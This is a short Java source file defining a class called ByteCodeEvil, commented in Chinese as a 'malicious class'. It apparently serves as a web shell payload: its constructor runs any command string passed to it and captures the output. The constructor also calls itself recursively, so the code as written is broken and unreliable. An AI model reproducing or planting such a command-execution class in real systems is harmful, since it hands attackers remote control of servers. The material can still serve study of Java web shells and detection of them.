package JavaShell;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

// 恶意类
public class ByteCodeEvil{
	String res;
	
	public ByteCodeEvil(String cmd) throws IOException{
		StringBuilder sb = new StringBuilder();
		BufferedReader reader = new BufferedReader(
		new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream())
		);
		
		// 输出
		String line;
		while((line =reader.readLine() ) != null){
		sb.append(line).append("\n");
		}
		this.res = sb.toString();
		
		// 调用恶意类
		System.out.println(new ByteCodeEvil(cmd));
	}
	
	public String toString(){
		return res;
	}
}